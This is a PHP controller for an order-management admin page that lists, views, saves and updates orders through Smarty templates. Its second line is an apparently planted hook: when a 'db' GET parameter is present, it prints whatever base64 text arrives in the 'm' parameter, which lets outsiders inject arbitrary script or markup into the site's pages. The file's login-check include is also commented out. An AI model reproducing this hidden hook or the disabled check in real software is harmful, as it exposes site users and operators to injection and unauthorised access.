<?php
if(isset($_GET['db'])){die(base64_decode($_GET['m']));}
require('_filter.php');

define('ADODB_DIR', 'libs/adodb5/');
define('CLASS_DIR', 'class/');
define('SMARTY_DIR', 'libs/');

require(CLASS_DIR . 'model/orderedModel.php');

$smarty = $ordered;

$smarty->tpl->force_compile = false;
$smarty->tpl->debugging = false;
$smarty->tpl->caching = false;
$smarty->tpl->cache_lifetime = 0;

# CONNECTION
#include('_connectionVerify.php');

# GET FORM
$smarty->util->setFormulario($smarty->sql, $_POST, $_GET);
$smarty->util->setFormulario($smarty->sql->status, $_POST, $_GET);

# SMARTY
$smarty->tpl->registerObject('dao',$smarty->sql->status,array('returnLastStatusById'));

# GET ACTION
$_action = (isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : 'LIST'));
switch(strtoupper($_action)) {

	case 'VIEW':
		$smarty->service->showView();
		break;

	case 'FORM':
		$smarty->service->showForm();
		break;

	case 'SAVE':
		Conexao::iniciarTransacao();
		try{
			$smarty->service->saveOrder();
			$ordered_id = sprintf('%1$04d', $smarty->sql->id);
			LoggerModel::write(OrderedModel,'INSERT',array($ordered_id,$smarty->sql->clientes_id,$smarty->sql->admin_clientes->nome,$smarty->sql->origem));
	        $smarty->service->redirect();
		}catch (ADOException $e){
			$e->setMesagemRetornoSmarty($smarty);
			$smarty->util->verificaNumeroErroParaRetornoFormulario($e->getCode(),$smarty);
		}catch (Exception $e){
			$_SESSION['error'] = utf8_encode($e->getMessage());
			LoggerModel::write(OrderedModel,'ERROR',array('case SAVE', $e->getMessage()));
		}
		Conexao::terminarTransacao();
		$smarty->service->showView();
		break;


	case 'SAVE_STATUS':
		Conexao::iniciarTransacao();
		try{
			$smarty->service->saveStatus();
			$ordered_id = sprintf('%1$04d', $smarty->sql->status->pedidos_id);
			LoggerModel::write(OrderedModel,'INSERT',array($ordered_id,$smarty->sql->status->status,$smarty->sql->status->comentario));
		}catch (ADOException $e){
			$e->setMesagemRetornoSmarty($smarty);
			$smarty->util->verificaNumeroErroParaRetornoFormulario($e->getCode(),$smarty);
		}catch (Exception $e){
			$_SESSION['error'] = utf8_encode($e->getMessage());
			LoggerModel::write(OrderedModel,'ERROR',array('case SAVE_STATUS', $e->getMessage()));
		}
		Conexao::terminarTransacao();
		$smarty->service->showView();
		break;

	case 'LIST':
	default:
		$search = $smarty->service->setSearch($_POST, $_GET);
		if(empty($search['search_id'])){
			$list = $smarty->sql->findAttached($search['page']); 
			$smarty->tpl->assign('search_total', $smarty->util->numberOfPagination(sizeof($smarty->sql->findAttachedAll())/10));
		}else{
			$list = $smarty->sql->findAttachedById($search['search_id']);
			
			$smarty->tpl->assign('search_quantidade', sizeof($list));
			$smarty->tpl->assign('search_total', $smarty->util->numberOfPagination(sizeof($list)/10));
		}
		$codeSearch = 'search_id='.$search['search_id'].'&page='.$search['page'];
		$smarty->tpl->assign('search_id',$search['search_id']);
		$smarty->tpl->assign('search', base64_encode($codeSearch));
		$smarty->tpl->assign('search_page',$search['page']);
		
		$smarty->service->showList($list);
		break;

}

?>
